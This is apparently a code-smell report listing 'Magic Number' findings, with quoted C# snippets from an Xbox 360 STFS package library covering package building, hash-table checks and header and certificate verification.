xSession.ThemeSettings.AvatarLightingAmbient.ToString ("X"));  		x2.Write (new byte[] {  			0xD'  			0xA  		});  		x2.Flush ();  		x2.Close ();  		if (!xSession.AddFile (x2.FileNameLong' "parameters.ini"))  			throw STFSExcepts.ThemeError;  	}  	else if (xSession.HeaderData.ThisType == PackageType.GamesOnDemand || xSession.HeaderData.ThisType == PackageType.HDDInstalledGame || xSession.HeaderData.ThisType == PackageType.OriginalXboxGame || xSession.HeaderData.ThisType == PackageType.SocialTitle)  		throw STFSExcepts.Game;  	xLog = LogIn;  	xHeader = xSession.HeaderData;  	xSTFSStruct = new STFSDescriptor (xSession.STFSType' 0);  	xIO = new DJsIO (true);  	List<BlockRecord> DirectoryBlockz = new List<BlockRecord> ();  	// switched2 = true;  	uint xcurblock = 0;  	for (ushort i = 0; i < xSession.GetDirectoryCount; i++) {  		DirectoryBlockz.Add (new BlockRecord ());  		DirectoryBlockz [DirectoryBlockz.Count - 1].ThisBlock = xcurblock++;  		/*if (!switched0.Contains((int)(xcurblock / Constants.BlockLevel[0])))                         switched0.Add((int)(xcurblock / Constants.BlockLevel[0]));                     if (!switched1.Contains((int)(xcurblock / Constants.BlockLevel[1])))                         switched1.Add((int)(xcurblock / Constants.BlockLevel[1]));*/}  	xFileBlocks = DirectoryBlockz.ToArray ();  	xWriteChain (xFileBlocks);  	xSTFSStruct.xDirectoryBlockCount = (ushort)xFileBlocks.Length;  	ushort xCurID = 0;  	xSession.xFolderDirectory.Sort (new Comparison<CFolderEntry> (sortpathct));  	foreach (CFolderEntry x in xSession.xFolderDirectory) {  		ushort pointer = 0xFFFF;  		if (x.xthispath.xPathCount () > 1)  			pointer = xGetParentFolder (x.Path).EntryID;  		xFolderDirectory.Add (new FolderEntry (x.Name' 0' xCurID++' pointer' this));  		xFolderDirectory [xFolderDirectory.Count - 1].xFixOffset ();  	}  	foreach (CFileEntry x in xSession.xFileDirectory) {  		ushort pointer = 0xFFFF;  		if (x.xthispath.xPathCount () > 1)  			pointer = xGetParentFolder (x.Path).EntryID;  		xFileDirectory.Add (new FileEntry (x.Name' (int)x.GetLength ()' false' xCurID++' pointer' this));  		List<BlockRecord> xAlloc = new List<BlockRecord> ();  		for (uint i = 0; i < x.BlockCount (); i++) {  			xAlloc.Add (new BlockRecord ());  			xAlloc [xAlloc.Count - 1].ThisBlock = xcurblock++;  			/*if (!switched0.Contains((int)(xcurblock / Constants.BlockLevel[0])))                             switched0.Add((int)(xcurblock / Constants.BlockLevel[0]));                         if (!switched1.Contains((int)(xcurblock / Constants.BlockLevel[1])))                             switched1.Add((int)(xcurblock / Constants.BlockLevel[1]));*/}  		xFileDirectory [xFileDirectory.Count - 1].xBlockCount = (uint)xAlloc.Count;  		xFileDirectory [xFileDirectory.Count - 1].xStartBlock = xAlloc [0].ThisBlock;  		xFileDirectory [xFileDirectory.Count - 1].xPackage = this;  		xFileDirectory [xFileDirectory.Count - 1].xFixOffset ();  		xWriteChain (xAlloc.ToArray ());  	}  	AddToLog ("Writing Entry Table");  	DJsIO xent;  	if (!xEntriesToFile (out xent))  		throw new Exception ();  	xWriteTo (ref xent' xFileBlocks);  	xent.Close ();  	VariousFunctions.DeleteFile (xent.FileNameLong);  	AddToLog ("Writing Files");  	uint curblck = xSession.GetDirectoryCount;  	foreach (CFileEntry z in xSession.xFileDirectory) {  		List<BlockRecord> w = new List<BlockRecord> ();  		uint ct = z.BlockCount ();  		for (uint y = 0; y < ct; y++) {  			w.Add (new BlockRecord ());  			w [w.Count - 1].ThisBlock = curblck++;  		}  		DJsIO x = null;  		try {  			x = new DJsIO (z.FileLocale' DJFileMode.Open' true);  			xWriteTo (ref x' w.ToArray ());  		}  		catch {  		}  		if (x != null)  			x.Dispose ();  	}  	xWriteTables ();  	xWriteHeader (xSigning);  	xIO.Close ();  	VariousFunctions.MoveFile (xIO.FileNameLong' xOutPath);  	xIO = new DJsIO (xOutPath' DJFileMode.Open' true);  	xActive = false;  }  catch (Exception x) {  	xFileDirectory = null;  	xFolderDirectory = null;  	xIO.Dispose ();  	throw x;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The following statement contains a magic number: if (xSession.HeaderData.ThisType == PackageType.ThematicSkin) {  	DJsIO x1 = new DJsIO (true);  	DJsIO x2 = new DJsIO (true);  	x1.Write ((int)xSession.ThemeSettings.StyleType);  	x1.Flush ();  	x1.Close ();  	if (!xSession.AddFile (x1.FileNameLong' "DashStyle"))  		throw STFSExcepts.ThemeError;  	x2.Write ("SphereColor=" + ((byte)xSession.ThemeSettings.Sphere).ToString ().PadRight (2' '\0'));  	x2.Write (new byte[] {  		0xD'  		0xA  	});  	x2.Write ("AvatarLightingDirectional=" + xSession.ThemeSettings.AvatarLightingDirectional0.ToString ("#0.0") + "'" + xSession.ThemeSettings.AvatarLightingDirectional1.ToString ("#0.0000") + "'" + xSession.ThemeSettings.AvatarLightingDirectional2.ToString ("#0.0") + "'0x" + xSession.ThemeSettings.AvatarLightingDirectional3.ToString ("X"));  	x2.Write (new byte[] {  		0xD'  		0xA  	});  	x2.Write ("AvatarLightingAmbient=0x" + xSession.ThemeSettings.AvatarLightingAmbient.ToString ("X"));  	x2.Write (new byte[] {  		0xD'  		0xA  	});  	x2.Flush ();  	x2.Close ();  	if (!xSession.AddFile (x2.FileNameLong' "parameters.ini"))  		throw STFSExcepts.ThemeError;  }  else if (xSession.HeaderData.ThisType == PackageType.GamesOnDemand || xSession.HeaderData.ThisType == PackageType.HDDInstalledGame || xSession.HeaderData.ThisType == PackageType.OriginalXboxGame || xSession.HeaderData.ThisType == PackageType.SocialTitle)  	throw STFSExcepts.Game;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The following statement contains a magic number: x2.Write ("SphereColor=" + ((byte)xSession.ThemeSettings.Sphere).ToString ().PadRight (2' '\0'));  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: try {  	// Verifies each level needed  	AddToLog ("Verifying Level 0");  	for (uint i = 0; i < xSTFSStruct.BlockCount; i++) {  		BlockRecord lvl = GetRecord (i' TreeLevel.L1);  		if (lvl.BlocksFree < Constants.BlockLevel [0]) {  			long xDataBlock = GenerateDataOffset (i);  			if (xDataBlock < xIO.Length) {  				long xHashLocale = xSTFSStruct.GenerateHashOffset (i' 0) + (lvl.Index << 0xC);  				xIO.Position = xHashLocale;  				byte[] xHash = xIO.ReadBytes (20);  				xReturn.Add (new Verified (ItemType.Data' XVerifyHash (xDataBlock' 0x1000' ref xHash)' xDataBlock' xHashLocale));  			}  		}  	}  	if (STFSStruct.BlockCount > Constants.BlockLevel [0]) {  		AddToLog ("Verifying Level 1");  		uint ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [0]) + 1);  		for (uint i = 0; i < ct; i++) {  			BlockRecord lvl = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L2);  			BlockRecord current = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L1);  			if (lvl.BlocksFree < Constants.BlockLevel [1] || current.BlocksFree < Constants.BlockLevel [0]) {  				long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC);  				if (xInputLocale < xIO.Length) {  					long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  					xIO.Position = xHashLocale;  					byte[] xHash = xIO.ReadBytes (20);  					xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  				}  			}  		}  		if (STFSStruct.BlockCount > Constants.BlockLevel [1]) {  			AddToLog ("Verifying Level 2");  			ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [1]) + 1);  			for (uint i = 0; i < ct; i++) {  				BlockRecord current = GetRecord (i * Constants.BlockLevel [1]' TreeLevel.L2);  				if (current.BlocksFree < Constants.BlockLevel [1]) {  					long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  					long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  					xIO.Position = xHashLocale;  					byte[] xHash = xIO.ReadBytes (20);  					xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  				}  			}  		}  	}  	xActive = false;  	return xReturn.ToArray ();  }  catch (Exception xerror) {  	xActive = false;  	throw xerror;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: try {  	// Verifies each level needed  	AddToLog ("Verifying Level 0");  	for (uint i = 0; i < xSTFSStruct.BlockCount; i++) {  		BlockRecord lvl = GetRecord (i' TreeLevel.L1);  		if (lvl.BlocksFree < Constants.BlockLevel [0]) {  			long xDataBlock = GenerateDataOffset (i);  			if (xDataBlock < xIO.Length) {  				long xHashLocale = xSTFSStruct.GenerateHashOffset (i' 0) + (lvl.Index << 0xC);  				xIO.Position = xHashLocale;  				byte[] xHash = xIO.ReadBytes (20);  				xReturn.Add (new Verified (ItemType.Data' XVerifyHash (xDataBlock' 0x1000' ref xHash)' xDataBlock' xHashLocale));  			}  		}  	}  	if (STFSStruct.BlockCount > Constants.BlockLevel [0]) {  		AddToLog ("Verifying Level 1");  		uint ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [0]) + 1);  		for (uint i = 0; i < ct; i++) {  			BlockRecord lvl = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L2);  			BlockRecord current = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L1);  			if (lvl.BlocksFree < Constants.BlockLevel [1] || current.BlocksFree < Constants.BlockLevel [0]) {  				long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC);  				if (xInputLocale < xIO.Length) {  					long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  					xIO.Position = xHashLocale;  					byte[] xHash = xIO.ReadBytes (20);  					xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  				}  			}  		}  		if (STFSStruct.BlockCount > Constants.BlockLevel [1]) {  			AddToLog ("Verifying Level 2");  			ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [1]) + 1);  			for (uint i = 0; i < ct; i++) {  				BlockRecord current = GetRecord (i * Constants.BlockLevel [1]' TreeLevel.L2);  				if (current.BlocksFree < Constants.BlockLevel [1]) {  					long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  					long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  					xIO.Position = xHashLocale;  					byte[] xHash = xIO.ReadBytes (20);  					xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  				}  			}  		}  	}  	xActive = false;  	return xReturn.ToArray ();  }  catch (Exception xerror) {  	xActive = false;  	throw xerror;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: try {  	// Verifies each level needed  	AddToLog ("Verifying Level 0");  	for (uint i = 0; i < xSTFSStruct.BlockCount; i++) {  		BlockRecord lvl = GetRecord (i' TreeLevel.L1);  		if (lvl.BlocksFree < Constants.BlockLevel [0]) {  			long xDataBlock = GenerateDataOffset (i);  			if (xDataBlock < xIO.Length) {  				long xHashLocale = xSTFSStruct.GenerateHashOffset (i' 0) + (lvl.Index << 0xC);  				xIO.Position = xHashLocale;  				byte[] xHash = xIO.ReadBytes (20);  				xReturn.Add (new Verified (ItemType.Data' XVerifyHash (xDataBlock' 0x1000' ref xHash)' xDataBlock' xHashLocale));  			}  		}  	}  	if (STFSStruct.BlockCount > Constants.BlockLevel [0]) {  		AddToLog ("Verifying Level 1");  		uint ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [0]) + 1);  		for (uint i = 0; i < ct; i++) {  			BlockRecord lvl = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L2);  			BlockRecord current = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L1);  			if (lvl.BlocksFree < Constants.BlockLevel [1] || current.BlocksFree < Constants.BlockLevel [0]) {  				long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC);  				if (xInputLocale < xIO.Length) {  					long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  					xIO.Position = xHashLocale;  					byte[] xHash = xIO.ReadBytes (20);  					xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  				}  			}  		}  		if (STFSStruct.BlockCount > Constants.BlockLevel [1]) {  			AddToLog ("Verifying Level 2");  			ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [1]) + 1);  			for (uint i = 0; i < ct; i++) {  				BlockRecord current = GetRecord (i * Constants.BlockLevel [1]' TreeLevel.L2);  				if (current.BlocksFree < Constants.BlockLevel [1]) {  					long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  					long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  					xIO.Position = xHashLocale;  					byte[] xHash = xIO.ReadBytes (20);  					xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  				}  			}  		}  	}  	xActive = false;  	return xReturn.ToArray ();  }  catch (Exception xerror) {  	xActive = false;  	throw xerror;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: for (uint i = 0; i < xSTFSStruct.BlockCount; i++) {  	BlockRecord lvl = GetRecord (i' TreeLevel.L1);  	if (lvl.BlocksFree < Constants.BlockLevel [0]) {  		long xDataBlock = GenerateDataOffset (i);  		if (xDataBlock < xIO.Length) {  			long xHashLocale = xSTFSStruct.GenerateHashOffset (i' 0) + (lvl.Index << 0xC);  			xIO.Position = xHashLocale;  			byte[] xHash = xIO.ReadBytes (20);  			xReturn.Add (new Verified (ItemType.Data' XVerifyHash (xDataBlock' 0x1000' ref xHash)' xDataBlock' xHashLocale));  		}  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (lvl.BlocksFree < Constants.BlockLevel [0]) {  	long xDataBlock = GenerateDataOffset (i);  	if (xDataBlock < xIO.Length) {  		long xHashLocale = xSTFSStruct.GenerateHashOffset (i' 0) + (lvl.Index << 0xC);  		xIO.Position = xHashLocale;  		byte[] xHash = xIO.ReadBytes (20);  		xReturn.Add (new Verified (ItemType.Data' XVerifyHash (xDataBlock' 0x1000' ref xHash)' xDataBlock' xHashLocale));  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (xDataBlock < xIO.Length) {  	long xHashLocale = xSTFSStruct.GenerateHashOffset (i' 0) + (lvl.Index << 0xC);  	xIO.Position = xHashLocale;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Data' XVerifyHash (xDataBlock' 0x1000' ref xHash)' xDataBlock' xHashLocale));  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (STFSStruct.BlockCount > Constants.BlockLevel [0]) {  	AddToLog ("Verifying Level 1");  	uint ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [0]) + 1);  	for (uint i = 0; i < ct; i++) {  		BlockRecord lvl = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L2);  		BlockRecord current = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L1);  		if (lvl.BlocksFree < Constants.BlockLevel [1] || current.BlocksFree < Constants.BlockLevel [0]) {  			long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC);  			if (xInputLocale < xIO.Length) {  				long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  				xIO.Position = xHashLocale;  				byte[] xHash = xIO.ReadBytes (20);  				xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  			}  		}  	}  	if (STFSStruct.BlockCount > Constants.BlockLevel [1]) {  		AddToLog ("Verifying Level 2");  		ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [1]) + 1);  		for (uint i = 0; i < ct; i++) {  			BlockRecord current = GetRecord (i * Constants.BlockLevel [1]' TreeLevel.L2);  			if (current.BlocksFree < Constants.BlockLevel [1]) {  				long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  				long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  				xIO.Position = xHashLocale;  				byte[] xHash = xIO.ReadBytes (20);  				xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  			}  		}  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (STFSStruct.BlockCount > Constants.BlockLevel [0]) {  	AddToLog ("Verifying Level 1");  	uint ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [0]) + 1);  	for (uint i = 0; i < ct; i++) {  		BlockRecord lvl = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L2);  		BlockRecord current = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L1);  		if (lvl.BlocksFree < Constants.BlockLevel [1] || current.BlocksFree < Constants.BlockLevel [0]) {  			long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC);  			if (xInputLocale < xIO.Length) {  				long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  				xIO.Position = xHashLocale;  				byte[] xHash = xIO.ReadBytes (20);  				xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  			}  		}  	}  	if (STFSStruct.BlockCount > Constants.BlockLevel [1]) {  		AddToLog ("Verifying Level 2");  		ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [1]) + 1);  		for (uint i = 0; i < ct; i++) {  			BlockRecord current = GetRecord (i * Constants.BlockLevel [1]' TreeLevel.L2);  			if (current.BlocksFree < Constants.BlockLevel [1]) {  				long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  				long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  				xIO.Position = xHashLocale;  				byte[] xHash = xIO.ReadBytes (20);  				xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  			}  		}  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: for (uint i = 0; i < ct; i++) {  	BlockRecord lvl = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L2);  	BlockRecord current = GetRecord (i * Constants.BlockLevel [0]' TreeLevel.L1);  	if (lvl.BlocksFree < Constants.BlockLevel [1] || current.BlocksFree < Constants.BlockLevel [0]) {  		long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC);  		if (xInputLocale < xIO.Length) {  			long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  			xIO.Position = xHashLocale;  			byte[] xHash = xIO.ReadBytes (20);  			xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  		}  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (lvl.BlocksFree < Constants.BlockLevel [1] || current.BlocksFree < Constants.BlockLevel [0]) {  	long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC);  	if (xInputLocale < xIO.Length) {  		long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  		xIO.Position = xHashLocale;  		byte[] xHash = xIO.ReadBytes (20);  		xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (xInputLocale < xIO.Length) {  	long xHashLocale = xSTFSStruct.GenerateHashOffset ((i * Constants.BlockLevel [0])' TreeLevel.L1) + (lvl.Index << 0xC);  	xIO.Position = xHashLocale;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (STFSStruct.BlockCount > Constants.BlockLevel [1]) {  	AddToLog ("Verifying Level 2");  	ct = (((xSTFSStruct.xBlockCount - 1) / Constants.BlockLevel [1]) + 1);  	for (uint i = 0; i < ct; i++) {  		BlockRecord current = GetRecord (i * Constants.BlockLevel [1]' TreeLevel.L2);  		if (current.BlocksFree < Constants.BlockLevel [1]) {  			long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  			long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  			xIO.Position = xHashLocale;  			byte[] xHash = xIO.ReadBytes (20);  			xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  		}  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: for (uint i = 0; i < ct; i++) {  	BlockRecord current = GetRecord (i * Constants.BlockLevel [1]' TreeLevel.L2);  	if (current.BlocksFree < Constants.BlockLevel [1]) {  		long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  		long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  		xIO.Position = xHashLocale;  		byte[] xHash = xIO.ReadBytes (20);  		xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  	}  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The following statement contains a magic number: if (current.BlocksFree < Constants.BlockLevel [1]) {  	long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC);  	long xHashLocale = GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2);  	xIO.Position = xHashLocale;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale));  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
